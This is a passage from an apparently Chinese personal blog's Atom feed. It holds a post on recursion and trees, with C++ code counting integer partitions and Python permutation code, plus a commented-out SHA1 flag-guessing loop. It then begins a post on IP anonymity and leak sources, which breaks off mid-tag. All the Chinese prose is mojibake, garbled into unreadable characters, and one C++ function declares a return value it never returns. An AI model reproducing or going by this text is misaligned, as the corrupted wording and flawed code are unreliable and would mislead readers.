    <content type="html"><![CDATA[<p>ğŸ˜„ç®—æ³•å¤ªèœã€‚<br><a id="more"></a></p><h1 id="Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘"><a href="#Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘" class="headerlink" title="Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘"></a>Algorithmâ€”â€”é€’å½’æ€æƒ³å’Œæ ‘</h1><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>å€ŸåŠ©ä¸€ç®€å•çš„ç®—æ³•ç¨‹åºè®¾è®¡é¢˜æ¥ç†Ÿæ‚‰<code>é€’å½’æ€æƒ³</code>å’Œ<code>ç®€å•Tree</code>.</p><pre class=" language-c++"><code class="language-c++">é¢˜é¢ä¸ºï¼šç»™ä¸€ä¸ªæ­£æ•´æ•°nï¼Œæ±‚æœ‰å¤šå°‘ç§é0çš„æ•´æ•°ç»„åˆä¹‹å’Œç­‰äºn.ä¾‹å¦‚ï¼š    2=1+1      3=1+1+1      3=1+2</code></pre><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>é€šè¿‡æ ‘åˆ†æ”¯çš„æ–¹å¼æ¥å¯»æ‰¾ç­”æ¡ˆï¼Œæ ‘çš„æ ¹<code>root=1</code>ï¼Œç„¶åé€æ¸å¾ªç¯è·å–æ¯ä¸ªåˆ†æ”¯ä¹‹å’Œä¸ºnï¼Œå°äºnåˆ™ç»§ç»­æ‰©å±•ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317161546.png" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>string <span class="token function">sort_string</span><span class="token punctuation">(</span>string it<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    string tmp <span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>arrchr<span class="token punctuation">[</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>it<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> arrchr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span>set<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">get_set</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> atree<span class="token punctuation">)</span><span class="token punctuation">{</span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> tmp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>atree<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        tmp<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">sort_string</span><span class="token punctuation">(</span>atree<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> head<span class="token punctuation">;</span>    cin<span class="token operator">>></span>num<span class="token punctuation">;</span>    <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å»é‡å¤„ç† </span>    set<span class="token operator">&lt;</span>string<span class="token operator">></span> result <span class="token operator">=</span> <span class="token function">get_set</span><span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> it<span class="token operator">=</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>it<span class="token punctuation">)</span><span class="token punctuation">{</span>        cout<span class="token operator">&lt;&lt;</span><span class="token operator">*</span>it<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//    for(int i=0;i&lt;tree.size();++i){</span><span class="token comment" spellcheck="true">//        cout&lt;&lt;tree.at(i)&lt;&lt;endl;</span><span class="token comment" spellcheck="true">//    }</span><span class="token punctuation">}</span></code></pre><p>å¯ä»¥çœ‹åˆ°flagå˜é‡å¯¹åº”çš„å°±æ˜¯Treeçš„åˆ†æ”¯æ€»æ•°ï¼Œè€Œé¢˜ç›®è¦æ±‚çš„æ˜¯æ²¡æœ‰é‡å¤ç»„åˆçš„ç»“æœï¼Œåœ¨æ ‘çš„åˆ†æ”¯ä¸­å­˜åœ¨é‡å¤çš„èŠ‚ç‚¹ï¼Œä¾‹å¦‚æˆ‘ä»¬è¦è·å¾—<code>n=5</code>çš„ç»“æœï¼Œé‚£ä¹ˆ<code>1-3-1</code>å’Œ<code>1-1-3</code>ä¸¤ä¸ªåˆ†æ”¯å°±äº§ç”Ÿäº†é‡å¤ï¼Œæ­¤æ—¶å¯¹æ ‘çš„åˆ†æ”¯è¿›è¡Œç»“ç‚¹æ’åºï¼Œç„¶åé€šè¿‡é›†åˆå»é‡ï¼Œè¿™æ—¶å¾—åˆ°çš„æ‰æ˜¯çœŸæ­£çš„ç»“æœã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190317162524.png" alt=""></p><p>å¦‚æœ<code>di_gui</code>ä¸ç”¨å…¨å±€å˜é‡flagçš„è¯ï¼Œå¯ä»¥æŠŠflagæ”¾å…¥æ–¹æ³•ä¸­ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">di_gui</span><span class="token punctuation">(</span><span class="token keyword">int</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> result<span class="token punctuation">,</span>string treeone<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>result<span class="token operator">-</span>head<span class="token punctuation">;</span><span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token operator">&lt;</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>            string treetmp <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">+</span><span class="token operator">=</span><span class="token function">di_gui</span><span class="token punctuation">(</span>i<span class="token operator">+</span>head<span class="token punctuation">,</span>result<span class="token punctuation">,</span>treetmp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;"dian"&lt;&lt;endl;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            string treetmp2 <span class="token operator">=</span> treeone<span class="token punctuation">;</span>            treetmp2<span class="token operator">+</span><span class="token operator">=</span><span class="token function">to_string</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>treetmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>            flag<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//cout&lt;&lt;flag&lt;&lt;endl;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h2><p>Pythonç‰ˆå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²æ’åˆ—ç»„åˆï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">perm</span><span class="token punctuation">(</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># è¿™é‡Œæ˜¯é€’å½’å‡½æ•°çš„å‡ºå£ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºè¿™é‡Œè¡¨ç¤ºï¼šä¸€ä¸ªé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼Œå®ƒçš„æ’åˆ—ç»„åˆå°±æ˜¯å®ƒè‡ªå·±ã€‚</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>s<span class="token punctuation">]</span>    sl<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#ä¿å­˜å­—ç¬¦ä¸²çš„æ‰€æœ‰å¯èƒ½æ’åˆ—ç»„åˆ</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#è¿™ä¸ªå¾ªç¯ï¼Œå¯¹åº” è§£é¢˜æ€è·¯1ï¼‰ç¡®å®šå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯è°ï¼Œæœ‰nç§å¯èƒ½ï¼ˆnä¸ºå­—ç¬¦ä¸²sçš„é•¿åº¦</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> perm<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#è¿™ä¸ªå¾ªç¯ï¼Œå¯¹åº” è§£é¢˜æ€è·¯2ï¼‰è¿›å…¥é€’å½’ï¼Œs[0:i]+s[i+1:]çš„æ„æ€å°±æ˜¯æŠŠsä¸­çš„s[i]ç»™å»æ‰</span>            sl<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># å¯¹åº” è§£é¢˜æ€è·¯2ï¼‰é—®é¢˜å°±ä»â€œè¿”å›å­—ç¬¦ä¸²ä¸­çš„å­—æ¯æ’åˆ—ç»„åˆâ€ **å˜æˆäº†** â€œè¿”å› ç¬¬ä¸€ä¸ªå­—æ¯+é™¤å»ç¬¬ä¸€ä¸ªå­—æ¯å¤–çš„å­—ç¬¦ä¸²çš„æ’åˆ—ç»„åˆâ€</span>    <span class="token keyword">return</span> sl<span class="token keyword">def</span> <span class="token function">sha1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># dict0 = '12eshcn'</span>    <span class="token comment" spellcheck="true"># dict1 = '!2eshcn'</span>    <span class="token comment" spellcheck="true"># dict2 = '!@eshcn'</span>    <span class="token comment" spellcheck="true"># dict3 = '1@eshcn'</span>    dicts <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true">#è¦æ’åˆ—ç»„åˆçš„å­—ç¬¦</span>    perm_nums<span class="token operator">=</span>perm<span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>perm_nums<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># for key in perm_nums:</span>    <span class="token comment" spellcheck="true">#      flag = "flag{%s}"%key</span>    <span class="token comment" spellcheck="true">#      if str(sha1(flag)) == "e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>åŒæ ·æ˜¯é€’å½’ï¼‹Treeçš„æ–¹æ³•è·å–åˆ°ç»“æœã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ğŸ˜„ç®—æ³•å¤ªèœã€‚&lt;br&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://www.yof3ng.xyz/categories/Algorithm/"/>
    
    
      <category term="Algorithm" scheme="http://www.yof3ng.xyz/tags/Algorithm/"/>
    
      <category term="Tree" scheme="http://www.yof3ng.xyz/tags/Tree/"/>
    
  </entry>
  
  <entry>
    <title>IPåŒ¿åæ€§ç ”ç©¶</title>
    <link href="http://www.yof3ng.xyz/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/"/>
    <id>http://www.yof3ng.xyz/2019/02/21/IPåŒ¿åæ€§ç ”ç©¶/</id>
    <published>2019-02-21T12:06:12.000Z</published>
    <updated>2019-04-02T08:39:40.080Z</updated>
    
    <content type="html"><![CDATA[<p>IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity</p><a id="more"></a><h1 id="IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity"><a href="#IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity" class="headerlink" title="IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity"></a>IPåŒ¿åæ€§ç ”ç©¶â€”â€”Anonymity</h1><h2 id="ä½•è°“åŒ¿åï¼Ÿ"><a href="#ä½•è°“åŒ¿åï¼Ÿ" class="headerlink" title="ä½•è°“åŒ¿åï¼Ÿ"></a>ä½•è°“åŒ¿åï¼Ÿ</h2><blockquote><p>åŒ¿åå®šä¹‰ä¸º<strong>æœªçŸ¥å§“åæˆ–æœªç¡®å®šèº«ä»½</strong>ã€‚æˆ‘ä»¬ä¸Šç½‘æ—¶å¹¶æ²¡æœ‰åŒ¿åï¼Œå³ä½¿åœ¨ä½¿ç”¨éšç§å·¥å…·å¦‚Torã€Bitcoinæˆ–VPNçš„æ—¶å€™ã€‚æ¯é¡¹æœåŠ¡è‡³å°‘æœ‰ä¸€æ¡å¯ä»¥ç”¨äºåŒºåˆ†ä¸åŒç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ— è®ºå…¶ä¸ºä¸€å¥—IPåœ°å€ï¼ˆVPNæˆ–Torï¼‰è¿˜æ˜¯ä¸€ä¸ªç”µå­é’±åŒ…ï¼ˆBitcoinï¼‰ã€‚è¿™ç§ä¿¡æ¯æœ¬èº«å¯èƒ½ä¸ä¼šæ³„éœ²ç”¨æˆ·çš„ä»»ä½•ç§äººä¿¡æ¯ï¼Œä½†å…¶å¯ä¸å…¶å®ƒç›¸ä¼¼ä¿¡æ¯è”ç³»èµ·æ¥ï¼Œæœ€ç»ˆç¡®å®šä¸ªäººçš„èº«ä»½ã€‚</p><p>VPNè™½ç„¶ä¸ä¼šä½¿å¾—æˆ‘ä»¬å®Œå…¨åŒ¿åï¼Œä½†å®ƒä¼šæå¤§å¢å¼ºä¸Šç½‘æ—¶çš„éšç§å’Œå®‰å…¨ã€‚</p></blockquote><p>æ—¢ç„¶ä¸å¯èƒ½åšåˆ°å®Œå…¨åŒ¿åï¼Œæˆ‘ä»¬åªèƒ½æé«˜ç›¸å¯¹åŒ¿åæ€§ï¼Œä»è€Œä½¿å¾—è‡ªå·±åœ¨ç½‘ç»œä¸­çš„<strong>éšç§åº¦æ›´é«˜</strong>ï¼Œ<strong>å®‰å…¨æ€§æ›´é«˜</strong>ã€‚</p><h2 id="ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„"><a href="#ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„" class="headerlink" title="ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„"></a>ä¸€å®šçš„åŒ¿åæ€§æ˜¯æœ‰å¿…è¦çš„</h2><p>äº’è”ç½‘æ—¶ä»£ï¼Œä¸ªäººéšç§çš„ä¿æŠ¤æ›´åŠ å¤æ‚ä¸å›°éš¾ï¼ŒäºŸå¾…å„ç§ä¿æŠ¤æ‰‹æ®µçš„æ›´æ–°å’Œåˆ›æ–°ã€‚æ¯”å¦‚åœ¨ç½‘ç»œç«‹æ³•å±‚é¢ï¼Œç›®å‰ä»æœ‰è®¸å¤šç©ºç™½ï¼Œç¼ºä¹ç›¸åº”çš„é¡¶å±‚è®¾è®¡ã€‚æœ‰å¿…è¦åœ¨ä¸ªäººä¿¡æ¯ä¿æŠ¤ã€ç”µå­å•†åŠ¡ç­‰é¢†åŸŸå»ºç«‹ä¸¥æ ¼å¥å…¨çš„æ³•å¾‹è§„å®šï¼Œåˆ’å®šäº’è”ç½‘æœåŠ¡å•†çš„â€œç¦åŒºâ€ï¼Œæ˜ç¡®æƒè´£ï¼Œè®©å¤„åœ¨å¼±åŠ¿çš„æ™®é€šç”¨æˆ·æ‹¥æœ‰çŸ¥æƒ…æƒã€é€‰æ‹©æƒä¸ç»´æƒçš„ä¾æ®ã€‚</p><p>å› è€Œåœ¨å½“ä»Šè¿™ä¸ªæ—¶ä»£ï¼Œä¸è®ºæ˜¯ä¿¡æ¯/ç½‘ç»œå®‰å…¨ä»ä¸šè€…ï¼Œè¿˜æ˜¯æ™®é€šç¾¤ä¼—éƒ½åº”è¯¥è‡ªä¸»åœ°å»æé«˜è‡ªå·±çš„å®‰å…¨æ„è¯†ï¼Œé€šè¿‡ä¸€äº›æªæ–½é˜²æ­¢è‡ªå·±çš„ä¿¡æ¯æ³„éœ²ã€‚</p><h2 id="ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ"><a href="#ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ"></a>ä»€ä¹ˆå› ç´ ä¼šæ³„éœ²ä½ çš„çœŸå®IPä¿¡æ¯ï¼Ÿ</h2><p>å¯ä»¥å°ç»“å‡ºä»¥ä¸‹å› ç´ ï¼š</p><ul><li>IPV4åœ°å€æ³„éœ²</li><li>IPV6åœ°å€æ³„éœ²</li><li>DNSæ³„éœ²</li><li>WebRTCæ³„éœ²</li><li>HTTPHeaderä¿¡æ¯æ³„éœ²</li><li>ç­‰ç­‰â€¦..</li></ul><h3 id="IPV4æ³„éœ²"><a href="#IPV4æ³„éœ²" class="headerlink" title="IPV4æ³„éœ²"></a>IPV4æ³„éœ²</h3><blockquote><p>IPv4ä½¿ç”¨32ä½ï¼ˆ4å­—èŠ‚ï¼‰åœ°å€ï¼Œå› æ­¤åœ°å€ç©ºé—´ä¸­åªæœ‰4,294,967,296ï¼ˆ232ï¼‰ä¸ªåœ°å€ã€‚ä¸è¿‡ï¼Œä¸€äº›åœ°å€æ˜¯ä¸ºç‰¹æ®Šç”¨é€”æ‰€ä¿ç•™çš„ï¼Œå¦‚ä¸“ç”¨ç½‘ç»œï¼ˆçº¦1800ä¸‡ä¸ªåœ°å€ï¼‰å’Œå¤šæ’­åœ°å€ï¼ˆçº¦2.7äº¿ä¸ªåœ°å€ï¼‰ï¼Œè¿™å‡å°‘äº†å¯åœ¨äº’è”ç½‘ä¸Šè·¯ç”±çš„åœ°å€æ•°é‡ã€‚éšç€åœ°å€ä¸æ–­è¢«åˆ†é…ç»™æœ€ç»ˆç”¨æˆ·ï¼ŒIPv4åœ°å€æ¯ç«­é—®é¢˜ä¹Ÿåœ¨éšä¹‹äº§ç”Ÿã€‚åŸºäºåˆ†ç±»ç½‘ç»œã€æ— ç±»åˆ«åŸŸé—´è·¯ç”±å’Œç½‘ç»œåœ°å€è½¬æ¢çš„åœ°å€ç»“æ„é‡æ„æ˜¾è‘—åœ°å‡å°‘äº†åœ°å€æ¯ç«­çš„é€Ÿåº¦ã€‚ä½†åœ¨2011å¹´2æœˆ3æ—¥ï¼Œåœ¨æœ€å5ä¸ªåœ°å€å—è¢«åˆ†é…ç»™5ä¸ªåŒºåŸŸäº’è”ç½‘æ³¨å†Œç®¡ç†æœºæ„ä¹‹åï¼ŒIANAçš„ä¸»è¦åœ°å€æ± å·²ç»ç”¨å°½ã€‚</p></blockquote><p>æˆ‘ä»¬ç°åœ¨å¸¸è¯´çš„IPåœ°å€å°±æ˜¯æŒ‡IPV4åœ°å€ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®webç«™ç‚¹æ—¶ï¼Œè¯·æ±‚å¤´ä¸­ä¼šåŒ…å«æˆ‘ä»¬çš„IPV4åœ°å€ï¼Œå› æ­¤å¯ä»¥è¢«æœåŠ¡å™¨è·å–åˆ°æˆ‘ä»¬çš„IPå¹¶è®°å½•è¿›å…¥æ—¥å¿—ã€‚</p><h3 id="IPV6æ³„éœ²"><a href="#IPV6æ³„éœ²" class="headerlink" title="IPV6æ³„éœ²"></a>IPV6æ³„éœ²</h3><blockquote><p>Internetåè®®ç‰ˆæœ¬6ï¼ˆIPv6ï¼‰æ˜¯Internetåè®®ï¼ˆIPï¼‰çš„æœ€æ–°ç‰ˆæœ¬ï¼ŒIPåè®®æ˜¯ä¸ºç½‘ç»œä¸Šçš„è®¡ç®—æœºæä¾›æ ‡è¯†å’Œå®šä½ç³»ç»Ÿå¹¶é€šè¿‡Internetè·¯ç”±æµé‡çš„é€šä¿¡åè®®ã€‚IPv6æ˜¯ç”±äº’è”ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ï¼ˆIETFï¼‰å¼€å‘çš„ï¼Œç”¨äºè§£å†³é•¿æœŸä»¥æ¥çš„IPv4åœ°å€è€—å°½é—®é¢˜ã€‚</p><p>é™¤äº†æ›´å¤§çš„å¯»å€ç©ºé—´ä¹‹å¤–ï¼ŒIPv6è¿˜æä¾›å…¶ä»–æŠ€æœ¯ä¼˜åŠ¿ã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒå…è®¸åˆ†å±‚åœ°å€åˆ†é…æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•æœ‰åŠ©äºè·¨Internetçš„<a href="https://en.wikipedia.org/wiki/Route_aggregation" target="_blank" rel="noopener">è·¯ç”±èšåˆ</a>ï¼Œä»è€Œé™åˆ¶äº†<a href="https://en.wikipedia.org/wiki/Routing_table" target="_blank" rel="noopener">è·¯ç”±è¡¨</a>çš„æ‰©å±•ã€‚æ‰©å±•å’Œç®€åŒ–äº†å¤šæ’­å¯»å€çš„ä½¿ç”¨ï¼Œå¹¶ä¸ºæœåŠ¡çš„æä¾›æä¾›äº†é¢å¤–çš„ä¼˜åŒ–ã€‚åœ¨åè®®çš„è®¾è®¡ä¸­å·²ç»è€ƒè™‘äº†è®¾å¤‡ç§»åŠ¨æ€§ï¼Œå®‰å…¨æ€§å’Œé…ç½®æ–¹é¢ã€‚</p><p>IPv6åœ°å€è¡¨ç¤ºä¸ºå…«ç»„ï¼Œæ¯ç»„å››ä¸ª<a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank" 